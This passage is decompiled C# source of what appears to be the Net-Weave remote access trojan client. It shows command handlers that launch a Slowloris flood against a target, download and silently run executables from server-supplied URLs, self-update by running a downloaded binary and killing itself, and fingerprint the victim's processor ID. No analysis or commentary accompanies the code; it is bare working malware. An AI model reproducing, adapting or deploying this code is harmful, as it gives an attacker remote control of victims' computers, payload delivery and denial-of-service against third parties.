					@class.method_9("Failed Plugin Execution: " + ex.Message);
				}
				break;
			case Class4.Enum1.const_11:
				try
				{
					Guid guid = new Guid(class2.ReadString());
					for (int i = 0; i < GClass1.sortedList_1.Count; i++)
					{
						if (GClass1.sortedList_1.Keys[i] == guid && (int)GClass1.sortedList_1.Values[i].get_CurrentState() == 1)
						{
							GClass1.sortedList_1.Values[i].Stop(sender);
							break;
						}
					}
				}
				catch
				{
					@class.method_9("Failed to stop plugin");
				}
				break;
			case Class4.Enum1.const_13:
				bool_0 = true;
				break;
			case Class4.Enum1.const_17:
				@class.method_10(bool_2: true);
				break;
			default:
				@class.method_9("Broken\\Invalid Header");
				break;
			case Class4.Enum1.const_19:
				bool_1 = true;
				int_0 = BitConverter.ToInt32(e.Byte_0, 0);
				@class.method_10(bool_2: true);
				break;
			case Class4.Enum1.const_20:
				if (Class1.Boolean_0)
				{
					@class.method_9(Class1.String_0 + " Flood Already Active");
					return;
				}
				Class1.smethod_0(Class1.Enum0.const_3, class2.ReadString(), class2.ReadInt32(), class2.ReadInt32(), class2.ReadInt32(), class2.ReadInt32(), @class);
				Class1.smethod_1();
				@class.method_9("Slowloris Flood Active");
				break;
			}
			class2.Close();
		}
		catch
		{
		}
	}

	private static void smethod_9(object sender, EventArgs e)
	{
		Class4 @class = (Class4)sender;
		Class14 class2 = new Class14();
		class2.Write(Class13.smethod_1());
		class2.Write(Class12.smethod_0());
		class2.Write(Class5.string_7);
		class2.Write(Class0.smethod_3(@class.String_1, bool_0: true));
		class2.Write(Class5.string_11);
		byte[] data = class2.method_0();
		@class.method_7(new Class9(Class4.Enum1.const_15, data).method_0());
		@class.method_3();
		Class8.smethod_0(@class);
		class2 = null;
		data = null;
	}

	private static void smethod_10(object sender, EventArgs e)
	{
		//IL_0080: Unknown result type (might be due to invalid IL or missing references)
		//IL_0086: Invalid comparison between Unknown and I4
		Class4 @class = (Class4)sender;
		Class8.smethod_1(@class);
		@class.method_11();
		if (bool_0)
		{
			Thread.Sleep(TimeSpan.FromSeconds(30.0));
			bool_0 = false;
		}
		else if (bool_1)
		{
			Thread.Sleep(TimeSpan.FromSeconds(int_0));
			int_0 = 0;
			bool_1 = false;
		}
		if (GClass1.sortedList_1.Count > 0)
		{
			foreach (IPlugin value in GClass1.sortedList_1.Values)
			{
				if ((int)value.get_CurrentState() == 1 && value.get_StopOnDisconnection())
				{
					value.Stop(sender);
				}
			}
		}
		@class.method_0();
	}

	private static void smethod_11(object sender, EventArgs0 e)
	{
	}

	private static void smethod_12(object sender, EventArgs e)
	{
		IPlugin val = (IPlugin)((sender is IPlugin) ? sender : null);
		try
		{
			if (val.get_StateObject() != null)
			{
				(val.get_StateObject() as Class4).method_9(((IPlugin)((sender is IPlugin) ? sender : null)).get_Name() + ": Stopped");
			}
		}
		catch
		{
		}
	}

	private static void smethod_13(object sender, EventArgs e)
	{
		IPlugin val = (IPlugin)((sender is IPlugin) ? sender : null);
		try
		{
			if (val.get_StateObject() != null)
			{
				(val.get_StateObject() as Class4).method_9(val.get_Name() + ": Started");
			}
		}
		catch
		{
		}
	}

	private static void smethod_14(IPlugin iplugin_0, PluginArgs pluginArgs_0)
	{
		try
		{
			pluginArgs_0.PluginGuid = iplugin_0.get_Guid();
			if (iplugin_0.get_StateObject() != null)
			{
				Class4 @class = iplugin_0.get_StateObject() as Class4;
				@class.method_7(new Class9(Class4.Enum1.const_12, Serializer.Serialize(pluginArgs_0)).method_0());
			}
		}
		catch (Exception ex)
		{
			Console.WriteLine("PLUGIN ERROR - Name: {0}, Error: {1}", iplugin_0.get_Name(), ex.Message);
			(iplugin_0.get_StateObject() as Class4).method_9(iplugin_0.get_Name() + ": Error");
		}
	}

	private static void smethod_15(object sender, EventArgs e)
	{
		IPlugin val = (IPlugin)((sender is IPlugin) ? sender : null);
		try
		{
			if (val.get_StateObject() != null)
			{
				(val.get_StateObject() as Class4).method_9(val.get_Name() + ": Executed");
			}
		}
		catch
		{
		}
	}

	private static void smethod_16(object object_0)
	{
		object[] array = (object[])object_0;
		try
		{
			string fileName = Path.GetTempFileName() + ".exe";
			WebClient webClient = new WebClient();
			(array[1] as Class4).method_9("Downloading");
			webClient.DownloadFile((string)array[0], fileName);
			Process.Start(fileName);
			webClient.Dispose();
			(array[1] as Class4).method_9("File Executed");
		}
		catch
		{
			(array[1] as Class4).method_9("Error Downloading File.");
		}
	}

	private static void smethod_17(object object_0)
	{
		object[] array = (object[])object_0;
		if (array[1].ToString() != Encoding.Default.GetString(Class0.smethod_1(Convert.FromBase64String(Class5.string_10), bool_0: false)))
		{
			(array[2] as Class4).method_9("Invalid password");
			return;
		}
		try
		{
			string fileName = Path.GetTempFileName() + ".exe";
			WebClient webClient = new WebClient();
			(array[2] as Class4).method_9("Downloading");
			webClient.DownloadFile((string)array[0], fileName);
			(array[2] as Class4).method_9("Updating");
			if (Class5.bool_0)
			{
				Class10.smethod_4();
			}
			(array[2] as Class4).method_10(bool_2: false);
			Process.Start(fileName);
			Process.GetCurrentProcess().Kill();
		}
		catch
		{
			(array[2] as Class4).method_9("Error Updating");
		}
	}

	private static void smethod_18()
	{
		new Thread(smethod_19).Start();
	}

	private static void smethod_19()
	{
		//IL_000d: Unknown result type (might be due to invalid IL or missing references)
		MessageBox.Show("A Net-Weave client is running on this PC.\nPress OK to close the client.", "", (MessageBoxButtons)0, (MessageBoxIcon)64);
		Process.GetCurrentProcess().Kill();
	}

	private static string smethod_20()
	{
		//IL_000b: Unknown result type (might be due to invalid IL or missing references)
		//IL_0011: Expected O, but got Unknown
		//IL_002a: Unknown result type (might be due to invalid IL or missing references)
		//IL_0030: Expected O, but got Unknown
		try
		{
			string text = string.Empty;
			ManagementClass val = new ManagementClass("win32_processor");
			ManagementObjectCollection instances = val.GetInstances();
			ManagementObjectEnumerator enumerator = instances.GetEnumerator();
			try
			{
				while (enumerator.MoveNext())
				{
					ManagementObject val2 = (ManagementObject)enumerator.get_Current();
					if (text == "")
					{
						text = ((ManagementBaseObject)val2).get_Properties().get_Item("processorID").get_Value()
							.ToString();
						break;
					}
				}
			}
			finally
			{
				((IDisposable)enumerator)?.Dispose();
			}
			return text;
		}
		catch
		{
		}
		return string.Empty;
	}

	private static string smethod_21(string string_1)
	{
		MD5 mD = MD5.Create();
		byte[] bytes = Encoding.ASCII.GetBytes(string_1);
		byte[] array = mD.ComputeHash(bytes);
		StringBuilder stringBuilder = new StringBuilder();
		for (int i = 0; i < array.Length; i++)
		{
			stringBuilder.Append(array[i].ToString("X2"));
		}
		return stringBuilder.ToString();
	}
}
